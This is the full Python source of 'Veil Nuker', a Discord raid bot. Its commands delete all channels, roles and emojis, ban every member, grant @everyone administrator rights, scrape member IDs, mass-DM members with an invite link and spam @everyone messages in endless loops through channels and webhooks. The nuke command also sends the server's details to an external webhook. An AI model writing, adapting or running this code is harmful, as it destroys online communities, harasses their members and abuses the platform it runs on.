import random 
import ctypes 
import discord.http
import pystyle
import discord
import asyncio
import aiohttp
from discord.ext import commands
import httpx
import threading
import os
import time
from colorama import Fore
import json
import requests
import string

lowercase = True

Y = Fore.YELLOW
fadeclr = pystyle.Colors.blue_to_white

toolname = 'Veil Nuker'
toolversion = '1.0.0'

banner = f'''

                 /$$    /$$          /$$ /$$
                | $$   | $$         |__/| $$
                | $$   | $$ /$$$$$$  /$$| $$
                |  $$ / $$//$$__  $$| $$| $$
                 \  $$ $$/| $$$$$$$$| $$| $$
                  \  $$$/ | $$_____/| $$| $$
                   \  $/  |  $$$$$$$| $$| $$
                    \_/    \_______/|__/|__/
                            
                                                                                                                                                                                                              
    ______________________________________________________________________

'''

global g, r, y

imageurl = 'https://cdn.discordapp.com/attachments/1300946336996397180/1301639467219554367/Kepernyokep_2024-10-31_113416-removebg-preview.png?ex=672535b8&is=6723e438&hm=62cd832c9008d1abd48cc857e47a79fdfab1f86ef75029123a3ea66f689e0c18&'

g = 'green'
r = 'red'
y = 'yellow'

good = [200,201,204]

def resize(width, height):
    os.system(f'mode {width}, {height}')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def title(title=''):
    if title == '':
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname}  ~  {toolversion}  ')
    else:
        ctypes.windll.kernel32.SetConsoleTitleW(f'{toolname}  ~  {toolversion}  ~  {title}')

def ask(inp):
    dainput = pystyle.Write.Input(text=f' {inp} ~/> ', color=fadeclr, interval=0.015, hide_cursor=True)
    return dainput

def main():
    clear()
    resize(87, 35)
    print(pystyle.Colorate.Horizontal(fadeclr, pystyle.Center.XCenter(banner)))
    #print(pystyle.Colorate.Horizontal(fadeclr, pystyle.Center.XCenter(f'Made by {developer1}')) + '\n')

global lastcmd

lastcmd = None

global token, prefix, spam_message, dm_message, channels_names, roles_names, rich_presence
with open('config.json', 'r') as file:
    configfile = json.load(file)
token = configfile['token']
prefix = configfile['prefix']
spam_message = configfile['config']['spam_message']
dm_message = configfile['config']['dm_message']
channels_names = configfile['config']['channels_names']
roles_names = configfile['config']['roles_names']
rich_presence = configfile['config']['rich_presence']

headers = {'Authorization': token}

bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
bot.remove_command('help')

clear()
main()
title('Starting bot...')
print(pystyle.Colorate.Horizontal(fadeclr, pystyle.Center.XCenter(f'Starting bot, please be patient...')))

def randstr(length):
    chars = string.ascii_letters + string.digits
    return ''.join(random.sample(chars, length))

def log(mode, msg):
    redstart = "Couldn't "
    greenstart = 'successfully '
    ti = f"{Fore.LIGHTBLACK_EX}{time.strftime('%H:%M:%S')}"
    if lowercase == False:
        #greenstart = greenstart.capitalize()
        redstart = redstart.capitalize()
    if lowercase == False and mode == "yellow":
        msg = str(msg).capitalize()
    if lowercase == False and mode == "green":
        msg = str(msg).capitalize()
    if mode == "green":
        print(' ' + ti + pystyle.Colorate.Horizontal(pystyle.Colors.green_to_white, f" {msg}"))
    elif mode == "red":
        print(' ' + ti + pystyle.Colorate.Horizontal(pystyle.Colors.red_to_white, f" {redstart}{msg}"))
    elif mode == "yellow":
        print(' ' + ti + pystyle.Colorate.Horizontal(pystyle.Colors.purple_to_blue, f" {msg}"))

@bot.event
async def on_ready():
    print()
    print(pystyle.Colorate.Horizontal(pystyle.Colors.green_to_white, pystyle.Center.XCenter(f'Successfully started bot!')))
    title('Started bot!')
    time.sleep(0.35)
    main()
    print(pystyle.Colorate.Horizontal(fadeclr, pystyle.Center.XCenter(f'Connected to {bot.user}')))
    print(pystyle.Colorate.Horizontal(fadeclr, pystyle.Center.XCenter(f'Help command: {prefix}help')) + '\n')
    title(f'Connected to {bot.user}  ~  Help command: {prefix}help')

@bot.command()
async def help(ctx):
    lastcmd = 'help'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}help')
    await ctx.message.delete()
    embed = discord.Embed(
        colour=discord.Colour.dark_blue(),
        title='Help command',
        description=f'Command used in server: [{ctx.guild.name}](https://discord.com/channels/{ctx.guild.id}/{ctx.channel.id})'
    )
    embed.set_footer(text=f'Powered by {toolname}')
    embed.set_author(name=f'{toolname}')
    
    embed.set_thumbnail(url=imageurl)
    #embed.set_image(url=imageurl)

    embed.add_field(name="🎩 | Nuking", value=f"`{prefix}nuke` > Nukes the server\n`{prefix}delc` > Deletes all channels\n`{prefix}delr` > Deletes all roles\n`{prefix}dele` > Deletes all emojis\n`{prefix}cc` > Creates 50 channels\n`{prefix}cr` > Creates 50 roles\n`{prefix}massdm` > DMs all members\n`{prefix}banall` > Bans everyone\n`{prefix}spam` > Spams all channels".replace('> ', '').lower())
    embed.add_field(name="🏴 | Other", value=f"`{prefix}admin` > Gives everyone admin perms\n`{prefix}rename` > Renames the server\n`{prefix}icon` > Changes the server icon\n`{prefix}rp` > Adds rich presence\n`{prefix}scrape` > Scrapes members IDs\n`{prefix}webraid` > Mass webhook raid".replace('> ', '').lower())

    await ctx.author.send(embed=embed)
    log(g, f'Sent help message to {ctx.author} in DMs')

@bot.command()
async def delc(ctx):
    lastcmd = 'delc'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}delc')
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            log(g, f"Deleted channel #{channel.name}")
        except discord.HTTPException as e: 
            if e.status == 429: 
                log(y, f"Ratelimited on delete channel #{channel.name}")
        except:
            log(r, f"delete channel #{channel.name}")

@bot.command()
async def scrape(ctx):
    lastcmd = 'scrape'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}scrape')
    await ctx.message.delete()
    file = open(f'scraped/{ctx.guild.id}.txt', 'w+')
    ids = []
    for member in list(ctx.guild.members):
        try:
            ids.append(member.id)
        except:
            pass
    for mid in ids:
        file.write(str(mid) + '\n')
    log(g, f'Scraped {len(ids)} member IDs. Saved to scraped/{ctx.guild.id}.txt')
    

@bot.command()
async def rename(ctx):
    lastcmd = 'rename'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}rename')
    await ctx.message.delete()
    await ctx.guild.edit(name=f'Fucked by {toolname}')
    log(g, 'Changed server name')

@bot.command()
async def icon(ctx):
    lastcmd = 'icon'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}icon')
    await ctx.message.delete()
    with open('logo.png', 'rb') as logofile:
        icon = logofile.read()
    await ctx.guild.edit(icon=icon)
    log(g, 'Changed server icon')

@bot.command()
async def rp(ctx):
    lastcmd = 'rp'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}rp')
    await ctx.message.delete()
    await bot.change_presence(activity=discord.Streaming(name=rich_presence, url='https://www.twitch.tv/vycehax'))
    log(g, f'Changed rich presence')

@bot.command()
async def delr(ctx):
    lastcmd = 'delr'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}delr')
    await ctx.message.delete()
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                log(g, f"Deleted role {role.name}")
            except discord.HTTPException as e: 
                if e.status == 429: 
                    log(y, f"Ratelimited on delete role {role.name}")
            except:
                log(r, f"delete role {role.name}")

@bot.command()
async def webraid(ctx):
    lastcmd = 'webraid'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}webraid')
    await ctx.message.delete()
    name = toolname
    msgs = [f'You got fucked by {name} :)', f'{name} runs you', f'{name} fucked you up', f'{name} nuked a server you were in :)', f'Cop {name} today!', f'{name} is the best']
    webhooks = []

    webnames = ['name fucked you', 'name on top', 'fucked by name', 'name just better', 'nuked by name', 'hacked by name', 'raided by name', 'destroyed by name', 'obliterated by name', 'rekt by name', 'name runs cord', 'name runs you']

    async def createweb(channel):
        try:
            webhook = await channel.create_webhook(name=channels_names+'-'+randstr(5))
            webhooks.append(webhook)
            log(g, f'Created webhook in #{channel.name}')
        except Exception as e:
            log(g, f'create webhook -> {e}')
        await asyncio.sleep(0.5)

    async def sendweb(web):
        while True:
            try:
                await web.send('@everyone ' + spam_message, username=channels_names+'-'+randstr(5), avatar_url=imageurl)
                log(g, f"Sent message to webhook {web.id}")
            except discord.HTTPException as e:
                if e.status == 429: 
                    log(y, f"Ratelimited on send message to webhook {web.id}")
            except:
                log(r, f"send message to webhook {web.id}")

    for i in range(1):
        wtaskss = [createweb(chan) for chan in ctx.guild.channels]
    for i in range(1):
        await asyncio.gather(*wtaskss)

    for i in range(30):
        wtasks = [sendweb(webh) for webh in webhooks]
    for i in range(30):
        await asyncio.gather(*wtasks)

@bot.command()
async def admin(ctx):
    lastcmd = 'admin'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}admin')
    await ctx.message.delete()
    for role in ctx.guild.roles:
        if role.name == "@everyone":
            try:
                await role.edit(permissions=discord.Permissions(administrator=True))
                log(g, f"Gave @everyone role admin perms")
            except discord.HTTPException as e: 
                if e.status == 429: 
                    log(y, f"Ratelimited on give @everyone role admin perms")
            except:
                log(r, f"give @everyone role admin perms")

@bot.command()
async def cc(ctx):
    lastcmd = 'cc'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}cc')
    await ctx.message.delete()
    async def task():
        for i in range(50):
            emojis = ['🤡', '🤣', '💙', '🎩', '💀', '🏴', '🎃', '🎱', '🔫', '💨', '⚡', '🚀', '🔥', '👻']
            name = toolname.split(' ')[0].lower()
            cnames = [f'nuked-by-{name}', f'fucked-by-{name}', f'{name}-on-top', f'{name}-killed-you', f'destroyed-by-{name}', f'{name}-runs-cord', f'{name}-runs-you', f'rekt-by-{name}', f'obliterated-by-{name}']
            try:
                async with aiohttp.ClientSession() as client:
                    channame = f'〚{random.choice(emojis)}〛' + channels_names+'-'+randstr(5)
                    data = {'name': channame, 'type': 0}
                    await client.post(f'https://discord.com/api/v10/guilds/{ctx.guild.id}/channels', json=data, headers=headers)
                #c = await ctx.guild.create_text_channel(f'〚{random.choice(emojis)}〛' + channels_names+'-'+randstr(5))
                log(g, f"Created channel #{channame}")
            except discord.HTTPException as e: 
                if e.status == 429: 
                    log(y, f"Ratelimited on create channel")
            except:
                log(r, f"create channel")
    await asyncio.run(task())

@bot.command()
async def cr(ctx):
    lastcmd = 'cr'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}cr')
    await ctx.message.delete()
    for i in range(50):
        name = toolname.split(' ')[0].lower()
        rnames = [f'nuked by {name}', f'fucked by {name}', f'{name} on top', f'{name} killed you', f'destroyed by {name}', f'{name} runs cord', f'{name} runs you']
        try:
            r = await ctx.guild.create_role(name=roles_names, color=0x0000ff)
            log(g, f"Created role {r.name}")
        except discord.HTTPException as e: 
            if e.status == 429: 
                log(y, f"Ratelimited on create role")
        except:
            log(r, f"create role")

@bot.command()
async def dele(ctx):
    lastcmd = 'dele'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}dele')
    await ctx.message.delete()
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            log(g, f"Deleted emoji :{emoji.name}:")
        except discord.HTTPException as e: 
            if e.status == 429: 
                log(y, f"Ratelimited on delete emoji :{emoji.name}:")
        except:
            log(r, f"delete emoji :{emoji.name}:")

@bot.command()
async def massdm(ctx):
    lastcmd = 'massdm'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}massdm')
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        name = toolname
        msgs = [f'You got fucked by {name} :)', f'{name} runs you', f'{name} fucked you up', f'{name} nuked a server you were in :)', f'Cop {name} today!', f'{name} is the best']
        if member != bot.user:
            try:
                await member.send(f'<@{member.id}> ' + dm_message + '\nhttps://discord.gg/veilgg)
                log(g, f"Sent DM to {member.name} ({member.id})")
            except discord.HTTPException as e: 
                if e.status == 429: 
                    log(y, f"Ratelimited on send dm to {member.name}")
            except:
                log(r, f"send DM to {member.name} ({member.id})")

@bot.command()
async def banall(ctx):
    lastcmd = 'banall'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}banall')
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        if member != bot.user:
            try:
                await member.ban()
                log(g, f"Banned member {member.name} ({member.id})")
            except:
                log(r, f"ban member {member.name} ({member.id})")

@bot.command()
async def spam(ctx):
    lastcmd = 'spam'
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}spam')
    await ctx.message.delete()
    name = toolname
    msgs = [f'You got fucked by {name} :)', f'{name} runs you', f'{name} fucked you up', f'{name} nuked a server you were in :)', f'Cop {name} today!', f'{name} is the best']
    for i in range(50):
        while True:
            for channel in ctx.guild.channels:
                try:
                    embed = discord.Embed(
                        colour=discord.Colour.dark_blue(),
                        title=spam_message + ' | ' + randstr(8),
                        description=spam_message
                    )
                    embed.set_author(name=toolname)
                    embed.set_footer(text='Powered by ' + toolname)
                    embed.set_thumbnail(url=imageurl)
                    await channel.send('@everyone ' + 'https://discord.gg/veilgg', embed=embed)
                    log(g, f"Sent message to #{channel.name}")
                except:
                    log(r, f"send message to #{channel.name}")

global nukeused
nukeused = False

@bot.command()
async def nuke(ctx):
    lastcmd = 'nuke'
    global nukeused
    nukeused = True
    global r, g, y
    
    print(); title(f'Connected to {bot.user}  ~  Last command: {prefix}{lastcmd}'); log(y, f'Command used in {ctx.guild.name} by {ctx.author}: {prefix}nuke')
    await ctx.message.delete()

    try:
        weburl = ''             # use webhook for the better view.
        data = {
            "content": "",
            "tts": False,
            "embeds": [
                {
                "id": 167474811,
                "fields": [
                    {
                    "id": 198777983,
                    "name": "Server ID",
                    "value": f"`{ctx.guild.id}`"
                    },
                    {
                    "id": 658206068,
                    "name": "Member count",
                    "value": f"`{ctx.guild.member_count}`"
                    },
                    {
                    "id": 542366393,
                    "name": "Bot name",
                    "value": f"`{bot.user}`"
                    },
                    {
                    "id": 646034422,
                    "name": "Server owner",
                    "value": f"`{ctx.guild.owner.name} ({ctx.guild.owner.id})`"
                    }
                ],
                "author": {
                    "name": "☢ | Server nuked"
                },
                "color": 955,
                "title": f"{ctx.guild.name}",
                "footer": {
                    "text": "Powered by Veil Nuker"
                }
                }
            ],
            "components": [],
            "actions": {},
            "username": f"Server nuked | {ctx.guild.name} ({ctx.guild.id})",
            "avatar_url": f"{ctx.guild.icon.url}"
        }
        requests.post(weburl, json=data, timeout=5)
    except:
        pass

    with open('logo.png', 'rb') as logofile:
        icon = logofile.read()

    await ctx.guild.edit(name=f'Fucked by {toolname}', icon=icon)

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            log(g, f"Deleted channel #{channel.name}")
        except discord.HTTPException as e: 
            if e.status == 429: 
                log(y, f"Ratelimited on delete channel #{channel.name}")
        except:
            log(r, f"delete channel #{channel.name}")

    try:
        await bot.change_presence(activity=discord.Streaming(name=rich_presence, url='https://www.twitch.tv/vycehax'))
        log(g, f'Changed rich presence')
    except discord.HTTPException as e: 
        if e.status == 429: 
            log(y, f"Ratelimited on change presence")
    except:
        log(r, f"change rich presence")

    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            log(g, f"Deleted emoji :{emoji.name}:")
        except discord.HTTPException as e: 
            if e.status == 429: 
                log(y, f"Ratelimited on delete emoji :{emoji.name}:")
        except:
            log(r, f"delete emoji :{emoji.name}:")

    for i in range(50):
        emojis = ['🤡', '🤣', '💙', '🎩', '💀', '🏴', '🎃', '🎱', '🔫', '💨', '⚡', '🚀', '🔥', '👻']
        name = toolname.split(' ')[0].lower()
        cnames = [f'nuked-by-{name}', f'fucked-by-{name}', f'{name}-on-top', f'{name}-killed-you', f'destroyed-by-{name}', f'{name}-runs-cord', f'{name}-runs-you', f'rekt-by-{name}', f'obliterated-by-{name}']
        try:
            c = await ctx.guild.create_text_channel(f'〚{random.choice(emojis)}〛' + channels_names+'-'+randstr(5))
            log(g, f"Created channel #{c.name}")
        except discord.HTTPException as e: 
            if e.status == 429: 
                log(y, f"Ratelimited on create channel")
        except:
            log(r, f"create channel")

    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                log(g, f"Deleted role {role.name}")
            except discord.HTTPException as e: 
                if e.status == 429: 
                    log(y, f"Ratelimited on delete role {role.name}")
            except:
                log(r, f"delete role {role.name}")

    for i in range(50):
        name = toolname.split(' ')[0].lower()
        rnames = [f'nuked by {name}', f'fucked by {name}', f'{name} on top', f'{name} killed you', f'destroyed by {name}', f'{name} runs cord', f'{name} runs you']
        try:
            r = await ctx.guild.create_role(name=roles_names, color=0x0000ff)
            log(g, f"Created role {r.name}")
        except discord.HTTPException as e: 
            if e.status == 429: 
                log(y, f"Ratelimited on create role")
        except:
            log(r, f"create role")

    for member in list(ctx.guild.members):
        name = toolname
        msgs = [f'You got fucked by {name} :)', f'{name} runs you', f'{name} fucked you up', f'{name} nuked a server you were in :)', f'Cop {name} today!', f'{name} is the best']
        if member != bot.user:
            try:
                await member.send(f'<@{member.id}> ' + dm_message + '\nhttps://discord.gg/veilgg')
                log(g, f"Sent DM to {member.name} ({member.id})")
            except discord.HTTPException as e: 
                if e.status == 429: 
                    log(y, f"Ratelimited on send DM to {member.name} ({member.id})")
            except:
                log(r, f"send DM to {member.name} ({member.id})")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        lastcmd = ctx.message.content
        await ctx.message.delete()
        message = ctx.message.content
        print(); title(f'Connected to {bot.user}  ~  Last command: {lastcmd}'); log(y, f'Command not found in {ctx.guild.name} by {ctx.author}: {message}')

@bot.event
async def on_guild_channel_create(channel):
    #if channel.name == cnames.replace(' ', '-').lower():
    if nukeused == True:
        name = toolname
        msgs = [f'You got fucked by {name} :)', f'{name} runs you', f'{name} fucked you up', f'Cop {name} today!', f'{name} is the best']
        while True:
            try:
                embed = discord.Embed(
                    colour=discord.Colour.dark_blue(),
                    title=spam_message + ' | ' + randstr(8),
                    description=spam_message
                )
                embed.set_author(name=toolname)
                embed.set_footer(text='Powered by ' + toolname)
                embed.set_thumbnail(url=imageurl)
                await channel.send('@everyone ' + 'https://discord.gg/veilgg', embed=embed)
                log(g, f"Sent message to #{channel.name}")
            except discord.HTTPException as e:
                if e.status == 429:
                    log(y, f"Ratelimited on send message to #{channel.name}")
            except Exception as e:
                log(r, f"send message to #{channel.name} {e}")

try:
    bot.run(token, log_handler=None)
except discord.LoginFailure:
    log(r, 'start bot (invalid token)')
